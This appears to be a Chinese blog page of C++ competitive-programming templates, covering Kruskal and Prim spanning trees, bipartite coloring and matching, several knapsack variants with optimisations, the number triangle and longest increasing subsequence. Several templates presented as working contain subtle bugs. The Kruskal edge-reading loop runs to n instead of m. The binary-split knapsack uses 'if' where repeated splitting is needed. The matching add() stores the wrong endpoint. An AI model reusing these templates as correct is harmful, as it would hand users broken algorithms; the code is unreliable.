<h2 id="kruskal"><a href="#kruskal" class="headerlink" title="kruskal"></a>kruskal</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//kruskal求最小生成树</span></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">200010</span>;</span><br><span class="line"><span class="type">int</span> p[N];</span><br><span class="line"><span class="type">int</span> n, m;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Edge</span> &#123;</span><br><span class="line">	<span class="type">int</span> a, b, w;</span><br><span class="line">	<span class="type">bool</span> <span class="keyword">operator</span>&lt; (<span class="type">const</span> Edge &amp;W)<span class="type">const</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> w &lt; W.w;</span><br><span class="line">	&#125;<span class="comment">//在之后针对w进行排序</span></span><br><span class="line">&#125;edges[N];</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">find</span><span class="params">(<span class="type">int</span> x)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (p[x] != x)p[x] = <span class="built_in">find</span>(p[x]);</span><br><span class="line">	<span class="keyword">return</span> p[x];</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	cin &gt;&gt;n &gt;&gt; m;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt;= n; i++) &#123;</span><br><span class="line">		<span class="type">int</span> a, b, w;</span><br><span class="line">		cin &gt;&gt; a &gt;&gt; b &gt;&gt; w;</span><br><span class="line">		edges[i] = &#123; a,b,w &#125;;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">sort</span>(edges, edges + m);<span class="comment">//按w的权重进行排序</span></span><br><span class="line">	<span class="type">int</span> res = <span class="number">0</span>, cnt = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++)p[i] = i;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt;m; i++) &#123;</span><br><span class="line">		<span class="type">int</span> a = edges[i].a, b = edges[i].b, w = edges[i].w;</span><br><span class="line">		a=<span class="built_in">find</span>(a); </span><br><span class="line">		b = <span class="built_in">find</span>(b);</span><br><span class="line">		<span class="keyword">if</span> (a != b) &#123;</span><br><span class="line">			p[a] = b;</span><br><span class="line">			res += w;</span><br><span class="line">			cnt++;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (cnt &lt; n - <span class="number">1</span>)cout &lt;&lt; <span class="string">&quot;impossible&quot;</span>;</span><br><span class="line">	<span class="keyword">else</span> cout &lt;&lt; res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="prim"><a href="#prim" class="headerlink" title="prim"></a>prim</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//在最小生成树中无所谓边的权重是正还是负</span></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">510</span>,inf=<span class="number">0x3f3f3f3f</span>;</span><br><span class="line"><span class="type">int</span> n, m;  </span><br><span class="line"><span class="type">int</span> g[N][N];</span><br><span class="line"><span class="type">int</span> dist[N];</span><br><span class="line"><span class="type">bool</span> st[N];</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">prim</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">memset</span>(dist, inf, <span class="keyword">sizeof</span> dist);</span><br><span class="line">    <span class="type">int</span> res = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">        <span class="type">int</span> t = <span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt;= n; j++) </span><br><span class="line">            <span class="keyword">if</span> (!st[j] &amp;&amp; (t == <span class="number">-1</span> || dist[t] &gt; dist[j]))</span><br><span class="line">                t = j;</span><br><span class="line">            <span class="keyword">if</span> (i&gt;<span class="number">0</span> &amp;&amp; dist[t] == inf)<span class="keyword">return</span> inf;<span class="comment">//因为第一次i=0的循环所有dist都是inf，只是为了第一次更新所有的dist为到1的最短距离</span></span><br><span class="line">            <span class="keyword">if</span> (i&gt;<span class="number">0</span>)res += dist[t];<span class="comment">//先累加再更新</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt;= n; j++)</span><br><span class="line">                dist[j] = <span class="built_in">min</span>(dist[j],g[t][j]);</span><br><span class="line">            st[t] = <span class="literal">true</span>;  </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    cin &gt;&gt; n &gt;&gt; m;</span><br><span class="line">    <span class="built_in">memset</span>(g, <span class="number">0x3f3f3f3f</span>, <span class="keyword">sizeof</span> g);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= m; i++) &#123;</span><br><span class="line">        <span class="type">int</span> x, y, c;</span><br><span class="line">        cin &gt;&gt; x &gt;&gt; y &gt;&gt; c;</span><br><span class="line">        g[x][y] = g[y][x] = <span class="built_in">min</span>(g[x][y],c);<span class="comment">//取得是边长的最小值，同时构建无向图</span></span><br><span class="line">    &#125;</span><br><span class="line">   <span class="type">int</span> t= <span class="built_in">prim</span>();</span><br><span class="line">   <span class="keyword">if</span> (t == inf)cout &lt;&lt; <span class="string">&quot;impossible&quot;</span>;</span><br><span class="line">   <span class="keyword">else</span> cout &lt;&lt; t;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="染色法判定二分图"><a href="#染色法判定二分图" class="headerlink" title="染色法判定二分图"></a>染色法判定二分图</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">add</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> </span>&#123;</span><br><span class="line">    e[idx] = b, ne[idx] = h[a], h[a] =idx++;<span class="comment">//链表</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">dfs</span><span class="params">(<span class="type">int</span> u, <span class="type">int</span> c)</span> </span>&#123;</span><br><span class="line">    color[u] = c;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = h[u]; i != <span class="number">-1</span>; i = ne[i]) &#123;</span><br><span class="line">        <span class="type">int</span> j = e[i];</span><br><span class="line">        <span class="keyword">if</span> (!color[j]) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="built_in">dfs</span>(j, <span class="number">3</span> - c)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;    </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (color[j] == c)<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;<span class="comment">//以邻接表的形式存储</span></span><br><span class="line">    <span class="built_in">memset</span>(h, <span class="number">-1</span>, <span class="keyword">sizeof</span> h);</span><br><span class="line">    <span class="type">bool</span> flag = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!color[i]) &#123;  </span><br><span class="line">            <span class="keyword">if</span> (!<span class="built_in">dfs</span>(i, <span class="number">1</span>)) &#123;</span><br><span class="line">                flag = <span class="literal">false</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">           &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (flag)cout &lt;&lt; <span class="string">&quot;yes&quot;</span>;</span><br><span class="line">    <span class="keyword">else</span> cout &lt;&lt; <span class="string">&quot;no&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="二分图的最大匹配"><a href="#二分图的最大匹配" class="headerlink" title="二分图的最大匹配"></a>二分图的最大匹配</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">add</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> </span>&#123;</span><br><span class="line">	e[idx] = a, ne[idx] = h[a], h[a] = idx++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">find</span><span class="params">(<span class="type">int</span> x)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = h[x]; ~i; i = ne[i]) &#123;</span><br><span class="line">		<span class="type">int</span> j = e[i];</span><br><span class="line">		<span class="keyword">if</span> (!st[j]) &#123;</span><br><span class="line">			st[j] = <span class="literal">true</span>;</span><br><span class="line">			<span class="keyword">if</span> (match[j] == <span class="number">0</span> || <span class="built_in">find</span>(match[j])) &#123;</span><br><span class="line">				match[j] = x;</span><br><span class="line">				<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	cin &gt;&gt; n1 &gt;&gt; n2 &gt;&gt; m;</span><br><span class="line">	<span class="keyword">while</span> (m--) &#123;</span><br><span class="line">		<span class="type">int</span> a, b;</span><br><span class="line">		cin &gt;&gt; a &gt;&gt; b;</span><br><span class="line">		<span class="built_in">add</span>(a, b);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n1; i++) &#123;</span><br><span class="line">		<span class="built_in">memset</span>(st, <span class="literal">false</span>, <span class="keyword">sizeof</span> st);</span><br><span class="line">		<span class="keyword">if</span> (<span class="built_in">find</span>(i))res++;</span><br><span class="line">	&#125;</span><br><span class="line">	cout &lt;&lt; res;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="动态规划"><a href="#动态规划" class="headerlink" title="动态规划"></a>动态规划</h1><blockquote>
<p>性质(动态规划和递推的区别)</p>
<p>递推求出的是数据，所以只是针对数据进行操作；而动态规划求出的是最优状态，所以必然也是针对状态的操作，而状态自然可以出现在最优解中，也可以不出现——这便是决策的特性（布尔性）。</p>
<p>其次，由于每个状态均可以由之前的状态演变形成，所以动态规划有可推导性，但同时，动态规划也有无后效性，即每个当前状态会且仅会决策出下一状态，而不直接对未来的所有状态负责，可以浅显的理解为——</p>
<p><strong>Future  never  has  to  do  with  past  time  ,but  present  does.</strong><br>现在决定未来，未来与过去无关</p>
</blockquote>
<h2 id="背包"><a href="#背包" class="headerlink" title="背包"></a>背包</h2><h3 id="01背包"><a href="#01背包" class="headerlink" title="01背包"></a><strong>01背包</strong></h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">1010</span>;</span><br><span class="line"><span class="type">int</span> v[N], w[N];</span><br><span class="line"><span class="type">int</span> f[N];<span class="comment">//本来是二维这里对其进行优化</span></span><br><span class="line"><span class="type">int</span> n, m;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	cin &gt;&gt; n &gt;&gt; m;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++)cin &gt;&gt; v[i] &gt;&gt; w[i];<span class="comment">//从第一个开始存放</span></span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> j = m; j &gt;=v[i]; j--) &#123;</span><br><span class="line">			f[j] = <span class="built_in">max</span>(f[j], f[j - v[i]] + w[i]);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;cout &lt;&lt; f[m];<span class="comment">//返回的是体的最积最大为m时的最大价值</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="多重背包"><a href="#多重背包" class="headerlink" title="多重背包"></a><strong>多重背包</strong></h3><p>f[i,j]&#x3D;max(f[i-1,j],f[i-1,j-v]+w,f[i-1,j-2v]+2w…f[i-1,j-sv]+sw)</p>
<p>f[i,j-v]&#x3D;max(f[i-1,j-v],f[i-1,j-2v]+w…f[i-1,j-sv]+(s-1)w,f[i-1,j-(s+1)v]+sw);</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//多重背包问题，多重背包是单重背包的变式，同时是完全背包问题加了部分约束</span></span><br><span class="line"><span class="comment">//这里是暴力做法加上一点维数优化</span></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">1e4</span>+<span class="number">10</span>;</span><br><span class="line"><span class="type">int</span> a[N], b[N], s[N];</span><br><span class="line"><span class="type">int</span> f[N];<span class="comment">//这是对二维的优化</span></span><br><span class="line"><span class="type">int</span> n, x,sum;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	cin &gt;&gt; n &gt;&gt; x ;</span><br><span class="line">	f[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++)cin &gt;&gt; a[i] &gt;&gt; b[i];<span class="comment">//将a[i],b[i]输入</span></span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> j = x; j &gt;= <span class="number">0</span>;j--) &#123;</span><br><span class="line">			<span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">1</span>; k &lt;= b[i]; k++) &#123;</span><br><span class="line">				<span class="keyword">if</span> (k * a[i] &lt;= j)&#123;</span><br><span class="line">               f[j] =<span class="built_in">max</span>( f[j],f[j - k * a[i]]);		 </span><br><span class="line">				&#125;		</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (f[x])cout &lt;&lt; <span class="string">&quot;Yes&quot;</span>;</span><br><span class="line">	<span class="keyword">else</span> cout &lt;&lt; <span class="string">&quot;No&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>优化思路，例如有s&#x3D;200，可以把他降成多个2的几次幂和加上一个差的数，从而将较大的数转化成要不要选较少的几个选项及01背包变式,即二进制优化<br>多重背包的优化,是将这么多件商品进行二进制化,, 每个件数都可以表示为多个2的不同次幂加上最后一个小于2^k+1的c值,将新的件数,放进质量和体积中,成为一个新的整体</p>
<h4 id="多重背包二进制优化版本"><a href="#多重背包二进制优化版本" class="headerlink" title="多重背包二进制优化版本"></a><em><strong>多重背包二进制优化版本</strong></em></h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">25000</span>;</span><br><span class="line"><span class="type">int</span> n, m;</span><br><span class="line"><span class="type">int</span> v[N], w[N];<span class="comment">//以v[i]表示体积,另一个表示权重即价值</span></span><br><span class="line"><span class="type">int</span> dp[N];</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	cin &gt;&gt; n &gt;&gt; m;</span><br><span class="line">	<span class="type">int</span> cnt=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">		<span class="type">int</span> a, b, s;</span><br><span class="line">		cin &gt;&gt; a&gt;&gt;b&gt;&gt;s; </span><br><span class="line">		<span class="type">int</span> k = <span class="number">1</span>;</span><br><span class="line">		<span class="keyword">if</span> (k &lt;= s) &#123;</span><br><span class="line">			cnt++,v[cnt] = k * a,w[cnt] = k * b,s -= k,k *= <span class="number">2</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (s &gt; <span class="number">0</span>) &#123;</span><br><span class="line">			cnt++,v[cnt] = s*a,w[cnt] = s * b;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	n = cnt;<span class="comment">//更换新的件数</span></span><br><span class="line">	<span class="comment">//即将多重背包转化成01背包</span></span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++)</span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> j = m; j &gt;= v[i]; j--)</span><br><span class="line">			dp[j] = <span class="built_in">max</span>(dp[j], dp[j - v[i]] + w[i]);</span><br><span class="line">	<span class="type">int</span> maxn=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= m; i++) &#123;</span><br><span class="line">		maxn = <span class="built_in">max</span>(maxn, dp[m]);</span><br><span class="line">	&#125;</span><br><span class="line">	cout &lt;&lt; maxn;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">    </span><br></pre></td></tr></table></figure>
<h4 id="多重背包的另外一种二进制优化"><a href="#多重背包的另外一种二进制优化" class="headerlink" title="多重背包的另外一种二进制优化"></a><strong>多重背包的另外一种二进制优化</strong></h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n;i++)&#123;</span><br><span class="line">    <span class="type">int</span> a, b, c;</span><br><span class="line">    cin &gt;&gt; b &gt;&gt; a &gt;&gt; c;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">1</span>; k &lt;= c;k*=<span class="number">2</span>)&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = m; j &gt;= a * k;j--)</span><br><span class="line">            f[j] = <span class="built_in">max</span>(f[j], f[j - a * k] + k * b);</span><br><span class="line">        c -= k;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(c)&#123;<span class="comment">//多出来的01背包跑一次</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = m; j &gt;= a * c;j--)</span><br><span class="line">            f[j] = <span class="built_in">max</span>(f[j], f[j - a * c] + b * c);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">cout &lt;&lt; f[m];</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="多重背包单调队列优化"><a href="#多重背包单调队列优化" class="headerlink" title="多重背包单调队列优化"></a>多重背包单调队列优化</h4><p><a href="https://www.cnblogs.com/BingweiHuang/p/15976681.html">单调队列优化dp参考文章</a></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="comment">// 多重背包问题： 限制每种物品可取次数</span></span><br><span class="line"><span class="comment">// 究极优化：单调队列</span></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> M = <span class="number">20010</span>, N = <span class="number">1010</span>;</span><br><span class="line"><span class="type">int</span> n, m;</span><br><span class="line"><span class="type">int</span> dp[M], g[M];</span><br><span class="line"><span class="type">int</span> que[M]; <span class="comment">// 队列只存储在同余的集合中是第几个，不存储对应值</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    cin &gt;&gt; n &gt;&gt; m;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)<span class="comment">//读入n个种类</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> v, w, s;</span><br><span class="line">        cin &gt;&gt; v &gt;&gt; w &gt;&gt; s;<span class="comment">//体积,价值和所选的个数</span></span><br><span class="line">        <span class="comment">// 复制一份副本g，因为这里会是从小到大，不能像0-1背包那样从大到小，所以必须申请副本存i-1状态的，不然会被影响</span></span><br><span class="line">        <span class="built_in">memcpy</span>(g, dp, <span class="keyword">sizeof</span> dp);<span class="comment">//是从前一次转换</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> r = <span class="number">0</span>; r &lt; v; r++)</span><br><span class="line">        &#123; <span class="comment">// 因为只有与v同余的状态 相互之间才会影响，余0,1,...,v-1 分为v组</span></span><br><span class="line">            <span class="type">int</span> head = <span class="number">0</span>, tail = <span class="number">-1</span>;<span class="comment">//head是对头,tail是队尾</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">0</span>; r + k * v &lt;= m; k++)<span class="comment">//同一组内便利每一个k,k为同余下的倍数.</span></span><br><span class="line">            &#123; <span class="comment">// 每一组都进行处理，就相当于对所有状态都处理了</span></span><br><span class="line">                </span><br><span class="line">                <span class="comment">//  队头不在窗口里面就踢出（队头距离要更新的dp超过了最大个数s，尽管它再大也要舍去，因为达不到）</span></span><br><span class="line">                <span class="keyword">if</span> (head &lt;= tail &amp;&amp; k - que[head] &gt;= s+<span class="number">1</span>)<span class="comment">//比如s=2,那么[3v+j]只能从[v+j]和[2v+j]转移得到,所以区间长度要小于等于s+1</span></span><br><span class="line">                    head++;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 这第k个准备进来，把不大于它的队尾统统踢掉，也是为了保持队列的单调降（判断式实际上是两边同时减去了k * w）</span></span><br><span class="line">                <span class="comment">// 实际意义应该是 g[r + k * v]+(k-k)*w &gt;= g[r + que[tail] * v] + (k - que[tail]) * w 为判断条件</span></span><br><span class="line">                <span class="keyword">while</span> (head &lt;= tail &amp;&amp; g[r + k * v] - k * w &gt;= g[r + que[tail] * v] - que[tail] * w)</span><br><span class="line">                    tail--;</span><br><span class="line"></span><br><span class="line">                que[++tail] = k; <span class="comment">// 将第k个入列，队列只存储在同余中是第几个，不存储对应值</span></span><br><span class="line">                <span class="comment">// 余r的这组的第k个取队头更新，队头永远是使之max的决策</span></span><br><span class="line">                dp[r + k * v] = g[r + que[head] * v] + (k - que[head]) * w;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    cout &lt;&lt; dp[m] &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="完全背包"><a href="#完全背包" class="headerlink" title="完全背包"></a><strong>完全背包</strong></h3><p><strong>状态转移方程推导</strong></p>
<p>f[i,j]&#x3D;max  (f[i-1,j],  f[i-1,j-v]+w,   f[i-1,j-2v]+2w…f[i-1,j-sv]+sw)&#x2F;&#x2F;s&#x3D;j&#x2F;v</p>
<p>f[i,j-v]&#x3D;max(f[i-1,j-v],f[i-1,j-2v]+w…f[i-1,j-sv]+(s-1)w);&#x2F;&#x2F;s&#x3D;j&#x2F;v</p>
<p> 故:<strong>f[i,j]&#x3D;max(f[i-1,j],f[i,j-v]+w);</strong></p>
<h4 id="完全背包问题的优化"><a href="#完全背包问题的优化" class="headerlink" title="完全背包问题的优化"></a>完全背包问题的优化</h4><p>对数据进行取舍,选物美价廉的商品,排除大于容量的商品</p>
<p>规律总结:</p>
<ul>
<li>当空间优化成为1维时只有完全背包的体积时<strong>从小到大循环的</strong></li>
<li>for物品,for体积,for决策</li>
</ul>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//一维优化</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">1010</span>;</span><br><span class="line"><span class="type">int</span> n, m;</span><br><span class="line"><span class="type">int</span> v[N], w[N];</span><br><span class="line"><span class="type">int</span> dp[N];</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	cin &gt;&gt; n &gt;&gt; m;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++)&#123;</span><br><span class="line">		cin &gt;&gt; w[i] &gt;&gt; v[i];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt;= n; i++)dp[i] = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> j = w[i]; j &lt;= m; j++) &#123;</span><br><span class="line">			dp[j] = <span class="built_in">max</span>(dp[j], dp[j - w[i]] + v[i]);<span class="comment">//数学上的化简</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	cout &lt;&lt; dp[m] &lt;&lt; endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="数字三角形"><a href="#数字三角形" class="headerlink" title="数字三角形"></a>数字三角形</h2><p><em>注意点</em> (多做题,积累经验)<br>1.初始化要考虑边界问题,每行多初始化一个<br>2.题目要求要从最上层到最底层的最大路径,要考虑到数字可以为负数(故要初始化为-∞)</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N=<span class="number">510</span>,inf=<span class="number">1e9</span>;</span><br><span class="line"><span class="type">int</span> n,dp[N][N],a[N][N];</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    cin&gt;&gt;n;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">1</span>;j&lt;=i;j++)</span><br><span class="line">    cin&gt;&gt;a[i][j];</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;=n;i++)</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;=i+<span class="number">1</span>;j++)<span class="comment">//初始化要考虑边界问题,每行多初始化一个</span></span><br><span class="line">    dp[i][j]=-inf;<span class="comment">//题目要求要从最上层到最底层的最大路径,要考虑到数字可以为负数</span></span><br><span class="line">    dp[<span class="number">1</span>][<span class="number">1</span>]=a[<span class="number">1</span>][<span class="number">1</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">2</span>;i&lt;=n;i++)</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">1</span>;j&lt;=i;j++)</span><br><span class="line">    dp[i][j]=<span class="built_in">max</span>(dp[i<span class="number">-1</span>][j]+a[i][j],dp[i<span class="number">-1</span>][j<span class="number">-1</span>]+a[i][j]);</span><br><span class="line">    <span class="type">int</span> res=-inf;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n;i++)res=<span class="built_in">max</span>(res,dp[n][i]);</span><br><span class="line">    cout&lt;&lt;res;</span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="最长上升子序列"><a href="#最长上升子序列" class="headerlink" title="最长上升子序列"></a>最长上升子序列</h2><p><strong>(求的是数值严格单调递增的子序列最大长度)</strong> </p>
<p>集合:所有以第i个数字结尾的上升子序列 属性:所有以该数字结尾的最大序列的最大长度<br>状态转移方程:(以第i-1个数字来分类)(分类方式是难点)<br><strong>最长上升子序列优化版本</strong> </p>
<p>设 dp[i] 表示长度为 i 的最长上升子序列的末尾元素的最小值，显然这个数组的权值一定单调不降。于是我们按顺序枚举数组nums，每一次对dp数组二分查找，找到小于nums[i]的最大的 dp[j]，并更新 dp[j+1]。</p>
